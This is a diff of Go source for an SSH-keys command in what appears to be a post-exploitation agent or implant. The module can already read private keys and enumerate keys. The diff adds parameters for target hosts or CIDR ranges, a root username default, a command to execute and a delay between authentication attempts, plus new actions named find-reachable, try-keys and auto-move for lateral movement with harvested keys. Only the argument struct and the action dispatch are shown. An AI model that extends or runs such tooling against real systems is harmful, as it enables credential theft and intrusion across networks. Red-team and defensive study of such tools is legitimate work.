@@ -1,5 +1,3 @@
-//go:build !windows
-
 package commands
 
 import (
@@ -24,17 +22,23 @@ func (c *SSHKeysCommand) Description() string {
 }
 
 type sshKeysArgs struct {
-	Action string `json:"action"`
-	Key    string `json:"key"`
-	User   string `json:"user"`
-	Path   string `json:"path"`
+	Action   string `json:"action"`
+	Key      string `json:"key"`
+	User     string `json:"user"`
+	Path     string `json:"path"`
+	Targets  string `json:"targets"`   // host list / CIDR for find-reachable / auto-move
+	Host     string `json:"host"`      // single target for try-keys
+	Username string `json:"username"`  // SSH username (default: root)
+	Command  string `json:"command"`   // command to run in auto-move (default: id)
+	Port     int    `json:"port"`      // SSH port (default: 22)
+	DelayMs  int    `json:"delay_ms"`  // ms between auth attempts (default: 500)
 }
 
 func (c *SSHKeysCommand) Execute(task structs.Task) structs.CommandResult {
 	var args sshKeysArgs
 
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Use action: list, add, remove, read-private")
+		return errorResult("Error: parameters required. Use action: list, add, remove, read-private, generate")
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
@@ -57,8 +61,16 @@ func (c *SSHKeysCommand) Execute(task structs.Task) structs.CommandResult {
 		return sshKeysReadPrivate(args)
 	case "enumerate":
 		return sshKeysEnumerate(args)
+	case "generate":
+		return sshKeysGenerate(args)
+	case "find-reachable":
+		return sshKeysFindReachable(args)
+	case "try-keys":
+		return sshKeysTryKeys(args)
+	case "auto-move":
+		return sshKeysAutoMove(args)
 	default:
-		return errorf("Unknown action: %s. Use: list, add, remove, read-private, enumerate", args.Action)
+		return errorf("Unknown action: %s. Use: list, add, remove, read-private, enumerate, generate, find-reachable, try-keys, auto-move", args.Action)
 	}
 }
 
@@ -67,14 +79,14 @@ func getSSHDir(targetUser string) (string, error) {
 	if targetUser != "" {
 		u, err := user.Lookup(targetUser)
 		if err != nil {
-			return "", fmt.Errorf("user '%s' not found: %v", targetUser, err)
+			return "", fmt.Errorf("user '%s' not found: %w", targetUser, err)
 		}
 		return filepath.Join(u.HomeDir, ".ssh"), nil
 	}
 	// Current user
 	home, err := os.UserHomeDir()
 	if err != nil {
-		return "", fmt.Errorf("cannot determine home directory: %v", err)
+		return "", fmt.Errorf("cannot determine home directory: %w", err)
 	}
 	return filepath.Join(home, ".ssh"), nil
 }
